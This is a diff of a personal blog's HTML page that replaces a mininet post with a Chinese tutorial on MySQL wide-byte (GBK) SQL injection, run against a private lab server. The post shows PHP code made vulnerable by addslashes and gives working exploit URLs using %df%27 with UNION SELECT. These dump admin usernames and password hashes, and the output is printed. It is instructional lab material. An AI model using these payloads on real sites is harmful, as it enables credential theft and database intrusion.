@@ -13,11 +13,11 @@
 
     <title>
         
-          mininet实战2 - 蔡奇奇的博客 | CaiQiqi&#39;s Blog
+          MySQL 宽字节注入 - 蔡奇奇的博客 | CaiQiqi&#39;s Blog
         
     </title>
 
-    <link rel="canonical" href="https://github.com/caiqiqi/2016/07/11/mininet实战2/">
+    <link rel="canonical" href="https://github.com/caiqiqi/2017/06/08/MySQL-宽字节注入/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -141,16 +141,14 @@
                 <div class="post-heading">
                     <div class="tags">
                         
-                          <a class="tag" href="/tags/#SDN" title="SDN">SDN</a>
-                        
-                          <a class="tag" href="/tags/#mininet" title="mininet">mininet</a>
+                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
                         
                     </div>
-                    <h1>mininet实战2</h1>
+                    <h1>MySQL 宽字节注入</h1>
                     <h2 class="subheading"></h2>
                     <span class="meta">
                         Posted by Cai Qiqi on
-                        2016-07-11
+                        2017-06-08
                     </span>
                 </div>
             </div>
@@ -169,7 +167,20 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <p>Edited on 5/14 03:13——————————–<br><img src="http://img.blog.csdn.net/20160514032442981" alt="这里写图片描述"><br>创建单OpenvSwitch然后四个主机的网络，h4作为http服务器，用h1访问h4 PS：<a href="https://www.youtube.com/watch?v=l25Ukkmk6Sk" target="_blank" rel="external">视频教程</a>讲得好！<br><div class="video-container"><iframe src="//www.youtube.com/embed/l25Ukkmk6Sk" frameborder="0" allowfullscreen></iframe></div><br><img src="http://img.blog.csdn.net/20160514032458201" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20160514032513576" alt="这里写图片描述"></p>
+                <p>参考：<br><a href="http://blog.csdn.net/jnbbwyth/article/details/6991425" target="_blank" rel="external">http://blog.csdn.net/jnbbwyth/article/details/6991425</a><br><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
+<h2 id="关于GBK编码和UTF-8编码"><a href="#关于GBK编码和UTF-8编码" class="headerlink" title="关于GBK编码和UTF-8编码"></a>关于GBK编码和UTF-8编码</h2><p>这个文件原文只有ASCII字符，当我加上两个汉字之后就不得不变成了UTF-8字符。<br><img src="http://img.blog.csdn.net/20170402151424182?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<p><code>iconv</code>这个工具(MacOS, ubuntu和kali好像是自带的)可以用来转换编码。<br>比如，将一个文件从<code>utf-8</code>编码格式转换成<code>gbk</code>编码格式。注意要写明输出的文件名(<code>-o</code>)，不然会输出到标准输出。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">iconv -f utf-8 -t gbk coding_test.php -o coding_test.php</div></pre></td></tr></table></figure></p>
+<p><img src="http://img.blog.csdn.net/20170402151516729?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>利用<code>xxd</code>这个工具可以发现，在<code>utf-8</code>编码方式下，通过<code>e5928c</code>这个三个字节来表示一个汉字”和”；而在<code>gbk</code>编码方式下，通过<code>bacd</code>这两个字节来表示一个汉字”和”。由于汉字无法通过ASCII编码显示出来，于是xxd右边用<code>...</code>来表示几个字节。</p>
+<h2 id="MySQL-宽字节注入"><a href="#MySQL-宽字节注入" class="headerlink" title="MySQL 宽字节注入"></a>MySQL 宽字节注入</h2><p>加单引号不报错，说明不存在注入<br><img src="http://img.blog.csdn.net/20170403150914824?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170403150824082?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>在这个sql语句前面，我们使用了一个<code>addslashes</code>函数，将<code>$id</code>的值转义。这是通常cms中对sql注入进行的操作，只要我们的输入参数在单引号中，就逃逸不出单引号的限制，无法注入。<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) ? addslashes($_GET[<span class="string">'id'</span>]) : <span class="number">1</span>;</div><div class="line">$sql = <span class="string">"SELECT * FROM news WHERE tid='&#123;$id&#125;'"</span>;</div></pre></td></tr></table></figure></p>
+<p>那么怎么逃过addslashes的限制？众所周知addslashes函数产生的效果就是，让<code>&#39;</code>变成<code>\&#39;</code>，让引号变得不再是“单引号”，只是一撇而已。一般绕过方式就是，想办法处理<code>\&#39;</code>前面的<code>\</code>：</p>
+<ol>
+<li>想办法给<code>\</code>前面再加一个<code>\</code>（或单数个即可），变成<code>\\’</code>，这样<code>\</code>被转义了，于是<code>&#39;</code>逃出了限制。</li>
+<li>想办法把<code>\</code>弄没有</li>
+</ol>
+<p>于是构造一个EXP。<br><code>http://192.168.10.163/data_and_sql/0x01/index.php?id=-1%a1%27UNION+Select+1,2,concat(name,0x23,pass)+FROM+admin#</code> <br><br><img src="http://img.blog.csdn.net/20170403153609289?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>这样还是不行。注意要把末尾的<code>#</code>urlencode一下。<br><code>http://192.168.10.163/data_and_sql/0x01/index.php?id=-1%df%27%20union%20select%201,2,concat(name,0x23,pass)%20from%20admin%23</code><br><img src="http://img.blog.csdn.net/20170403153655673?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvY2FpcWlpcWk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><figure class="highlight"><table><tr><td class="code"><pre><div class="line">MariaDB [test]&gt; select concat(name,0x23,pass) from admin;</div><div class="line">+----------------------------------------+</div><div class="line">| concat(name,0x23,pass)                 |</div><div class="line">+----------------------------------------+</div><div class="line">| admin#21232f297a57a5a743894a0e4a801fc3 |</div><div class="line">+----------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<p>其中<code>0x23</code>代表<code>#</code>。<code>concat(param1,param2,param3)</code>表示将这三个参数连接起来。</p>
+<h2 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h2><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">mysql_set_charset(&quot;utf8&quot;,$link);</div><div class="line">mysql_query(&quot;SET NAMES &apos;UTF8&apos;&quot;);</div></pre></td></tr></table></figure>
+<p>这两行的区别。<br><code>mysql_set_charset(&quot;utf8&quot;,$link);</code>其实做了<code>mysql_query(&quot;SET NAMES &#39;UTF8&#39;&quot;);</code>它做的事。而且后者并不被PHP官方建议。PHP官方建议使用前者，也就是<code>mysql_set_charset(&quot;utf8&quot;,$link);</code><br><a href="http://stackoverflow.com/questions/4361459/php-pdo-charset-set-names" target="_blank" rel="external">PHP PDO: charset, set names?</a><br><a href="http://stackoverflow.com/questions/26596294/set-names-vs-mysqli-set-charset-besides-affecting-mysqli-escape-string-are" target="_blank" rel="external">“set names” vs mysqli_set_charset — besides affecting mysqli_escape_string, are they identical?</a></p>
 
 
                 <hr>
@@ -178,13 +189,9 @@
 
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/2016/07/11/mininet实战3/" data-toggle="tooltip" data-placement="top" title="mininet实战3">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/2016/07/11/mininet实战/" data-toggle="tooltip" data-placement="top" title="mininet实战">Next Post &rarr;</a>
+                            <a href="/2017/04/13/ubuntu-kali设置时间/" data-toggle="tooltip" data-placement="top" title="ubuntu/kali设置时间">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -211,9 +218,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#SDN" title="SDN">SDN</a>
-                        
-                          <a class="tag" href="/tags/#mininet" title="mininet">mininet</a>
+                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
                         
                     </div>
                 </section>
